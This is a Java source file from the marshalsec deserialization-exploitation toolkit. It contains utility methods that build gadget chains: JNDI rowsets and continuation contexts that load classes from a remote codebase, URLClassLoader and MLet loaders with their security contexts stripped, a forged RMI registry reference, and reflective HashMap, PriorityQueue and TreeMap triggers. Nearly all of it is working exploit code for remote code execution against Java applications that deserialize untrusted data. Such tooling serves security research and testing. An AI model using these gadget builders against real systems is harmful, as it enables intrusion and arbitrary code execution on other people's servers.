/* MIT License

Copyright (c) 2017 Moritz Bechler

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
package marshalsec.gadgets;


import java.io.InputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.math.BigInteger;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;
import java.rmi.RemoteException;
import java.rmi.server.ObjID;
import java.util.Comparator;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Hashtable;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.PriorityQueue;
import java.util.Queue;
import java.util.ServiceLoader;
import java.util.TreeMap;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.NullCipher;
import javax.management.loading.MLet;
import javax.naming.Binding;
import javax.naming.CannotProceedException;
import javax.naming.NamingEnumeration;
import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.directory.DirContext;
import javax.naming.directory.SearchResult;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl;
import com.sun.rowset.JdbcRowSetImpl;

import marshalsec.UtilFactory;
import marshalsec.util.Reflections;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;


/**
 * @author mbechler
 *
 */
public final class JDKUtil {

    /**
     * 
     */
    private JDKUtil () {}


    public static JdbcRowSetImpl makeJNDIRowSet ( String jndiUrl ) throws Exception {
        JdbcRowSetImpl rs = new JdbcRowSetImpl();
        rs.setDataSourceName(jndiUrl);
        rs.setMatchColumn("foo");
        Reflections.getField(javax.sql.rowset.BaseRowSet.class, "listeners").set(rs, null);
        return rs;
    }


    public static DirContext makeContinuationContext ( String codebase, String clazz ) throws Exception {
        Class<?> ccCl = Class.forName("javax.naming.spi.ContinuationDirContext"); //$NON-NLS-1$
        Constructor<?> ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);
        ccCons.setAccessible(true);
        CannotProceedException cpe = new CannotProceedException();
        Reflections.setFieldValue(cpe, "stackTrace", new StackTraceElement[0]);
        cpe.setResolvedObj(new Reference("Foo", clazz, codebase));
        return (DirContext) ccCons.newInstance(cpe, null);
    }


    @SuppressWarnings ( "resource" )
    public static Object makeIteratorTriggerNative ( UtilFactory uf, Object it ) throws Exception, ClassNotFoundException, NoSuchMethodException,
            InstantiationException, IllegalAccessException, InvocationTargetException {
        Cipher m = Reflections.createWithoutConstructor(NullCipher.class);
        Reflections.setFieldValue(m, "serviceIterator", it);
        Reflections.setFieldValue(m, "lock", new Object());

        InputStream cos = new CipherInputStream(null, m);

        Class<?> niCl = Class.forName("java.lang.ProcessBuilder$NullInputStream"); //$NON-NLS-1$
        Constructor<?> niCons = niCl.getDeclaredConstructor();
        niCons.setAccessible(true);

        Reflections.setFieldValue(cos, "input", niCons.newInstance());
        Reflections.setFieldValue(cos, "ibuffer", new byte[0]);

        Object b64Data = Class.forName("com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data").newInstance();
        DataSource ds = (DataSource) Reflections
                .createWithoutConstructor(Class.forName("com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource")); //$NON-NLS-1$
        Reflections.setFieldValue(ds, "is", cos);
        Reflections.setFieldValue(b64Data, "dataHandler", new DataHandler(ds));
        Reflections.setFieldValue(b64Data, "data", null);

        Object nativeString = Reflections.createWithoutConstructor(Class.forName("jdk.nashorn.internal.objects.NativeString"));
        Reflections.setFieldValue(nativeString, "value", b64Data);
        return uf.makeHashCodeTrigger(nativeString);
    }


    public static Object adaptEnumerationToIterator ( Enumeration<?> enu ) throws ClassNotFoundException, NoSuchMethodException,
            InstantiationException, IllegalAccessException, InvocationTargetException, Exception {
        Class<?> clIt = Class.forName("sun.misc.Service$LazyIterator");
        Constructor<?> licons = clIt.getDeclaredConstructor(Class.class, ClassLoader.class);
        licons.setAccessible(true);
        ServiceLoader<?> sl = Reflections.createWithoutConstructor(ServiceLoader.class);
        Object iter = licons.newInstance(null, null);
        Reflections.setFieldValue(sl, "providers", new LinkedHashMap<>());
        Reflections.setFieldValue(iter, "configs", enu);
        return iter;
    }


    public static Iterator<?> makeServiceIterator ( ClassLoader cl, Class<?> service ) throws Exception {
        Class<?> clIt = Class.forName("sun.misc.Service$LazyIterator");
        Constructor<?> lciCons = clIt.getDeclaredConstructor(Class.class, ClassLoader.class);
        lciCons.setAccessible(true);
        return (Iterator<?>) lciCons.newInstance(service, cl);
    }


    public static Iterable<?> makeServiceLoader ( ClassLoader cl, Class<?> service ) throws Exception {
        return ServiceLoader.load(service, cl);
    }


    public static URLClassLoader makeURLClassLoader ( String url ) throws MalformedURLException, Exception {
        URLClassLoader ucl = new URLClassLoader(new URL[] {
            new URL(url)
        });
        Reflections.setFieldValue(ucl, "parent", null);
        Reflections.setFieldValue(ucl, "domains", new HashSet<>());
        Reflections.setFieldValue(ucl, "defaultDomain", null);
        Reflections.setFieldValue(ucl, "acc", null);

        Reflections.setFieldValue(Reflections.getFieldValue(ucl, "ucp"), "acc", null);
        return ucl;
    }


    public static URLClassLoader makeMLet ( String url ) throws MalformedURLException, Exception {
        URLClassLoader ucl = new MLet(new URL[] {
            new URL(url)
        });
        Reflections.setFieldValue(ucl, "parent", null);
        Reflections.setFieldValue(ucl, "domains", new HashSet<>());
        Reflections.setFieldValue(ucl, "defaultDomain", null);
        Reflections.setFieldValue(ucl, "acc", null);

        Reflections.setFieldValue(Reflections.getFieldValue(ucl, "ucp"), "acc", null);
        return ucl;
    }


    @SuppressWarnings ( "unchecked" )
    public static Enumeration<?> makeLazySearchEnumeration ( String codebase, String clazz ) throws Exception {
        DirContext ctx = makeContinuationContext(codebase, clazz);
        NamingEnumeration<?> inner = Reflections.createWithoutConstructor(LazySearchEnumerationImpl.class);
        Reflections.setFieldValue(inner, "nextMatch", new SearchResult("foo", ctx, null));
        return new LazySearchEnumerationImpl((NamingEnumeration<Binding>) inner, null, null);
    }


    public static Enumeration<?> makeBindingEnumeration ( String codebase, String clazz ) throws ClassNotFoundException, NoSuchMethodException,
            InstantiationException, IllegalAccessException, InvocationTargetException, Exception, NamingException, RemoteException {
        Class<?> cl = Class.forName("com.sun.jndi.rmi.registry.BindingEnumeration");
        Object enu = Reflections.createWithoutConstructor(cl);
        Reflections.setFieldValue(enu, "ctx", makeRegistryContext(makeRegistryImpl(codebase, clazz)));
        Reflections.setFieldValue(enu, "names", new String[] {
            "exp"
        });
        Reflections.setFieldValue(enu, "nextName", 0);
        return (Enumeration<?>) enu;
    }


    private static Object makeRegistryImpl ( String codebase, String clazz ) throws IllegalArgumentException, Exception {
        Class<?> regcl = Class.forName("sun.management.jmxremote.SingleEntryRegistry");
        Object reg = Reflections.createWithoutConstructor(regcl);
        Reflections.setFieldValue(reg, "name", "exp");

        TCPEndpoint te = new TCPEndpoint("127.0.0.1", 1337);
        LiveRef liveRef = new LiveRef(new ObjID(), te, true);
        UnicastRef value = new UnicastRef(liveRef);
        Reflections.setFieldValue(reg, "ref", value);
        Reflections.setFieldValue(reg, "object", makeReference(codebase, clazz));
        return reg;
    }


    private static ReferenceWrapper makeReference ( String codebase, String clazz ) throws Exception {
        Reference ref = new Reference("Foo", clazz, codebase);
        ReferenceWrapper wrapper = Reflections.createWithoutConstructor(ReferenceWrapper.class);
        Reflections.setFieldValue(wrapper, "wrappee", ref);
        Reflections.setFieldValue(wrapper, "ref", Reflections.createWithoutConstructor(sun.rmi.server.UnicastServerRef.class));
        return wrapper;
    }


    private static Object makeRegistryContext ( Object regi ) throws ClassNotFoundException, NoSuchMethodException, InstantiationException,
            IllegalAccessException, InvocationTargetException, Exception {
        Class<?> regctxcl = Class.forName("com.sun.jndi.rmi.registry.RegistryContext");
        Object regctx = Reflections.createWithoutConstructor(regctxcl);
        Reflections.setFieldValue(regctx, "registry", regi);
        return regctx;
    }


    public static HashMap<Object, Object> makeMap ( Object v1, Object v2 ) throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        Reflections.setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Reflections.setFieldValue(s, "table", tbl);
        return s;
    }


    @SuppressWarnings ( {
        "rawtypes", "unchecked"
    } )
    public static Queue<Object> makePriorityQueue ( Object tgt, Comparator comparator ) throws Exception {
        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<>(2, comparator);
        // stub data for replacement later
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[ 0 ] = tgt;
        queueArray[ 1 ] = tgt;

        return queue;
    }


    @SuppressWarnings ( {
        "rawtypes", "unchecked"
    } )
    public static TreeMap<Object, Object> makeTreeMap ( Object tgt, Comparator comparator ) throws Exception {
        TreeMap<Object, Object> tm = new TreeMap<>(comparator);

        Class<?> entryCl = Class.forName("java.util.TreeMap$Entry");
        Constructor<?> entryCons = entryCl.getDeclaredConstructor(Object.class, Object.class, entryCl);
        entryCons.setAccessible(true);
        Field leftF = Reflections.getField(entryCl, "left");

        Field rootF = Reflections.getField(TreeMap.class, "root");
        Object root = entryCons.newInstance(tgt, tgt, null);
        leftF.set(root, entryCons.newInstance(tgt, tgt, root));
        rootF.set(tm, root);
        Reflections.setFieldValue(tm, "size", 2);
        return tm;
    }


    public static <T> T createProxy ( final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces ) {
        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[ 0 ] = iface;
        if ( ifaces.length > 0 ) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(TemplatesUtil.class.getClassLoader(), allIfaces, ih));
    }


    public static Map<String, Object> createMap ( final String key, final Object val ) {
        final Map<String, Object> map = new HashMap<>();
        map.put(key, val);
        return map;
    }


    public static InvocationHandler createMemoizedInvocationHandler ( final Map<String, Object> map ) throws Exception {
        return (InvocationHandler) Reflections.getFirstCtor(TemplatesUtil.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
    }


    public static <T> T createMemoitizedProxy ( final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces ) throws Exception {
        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
    }

}
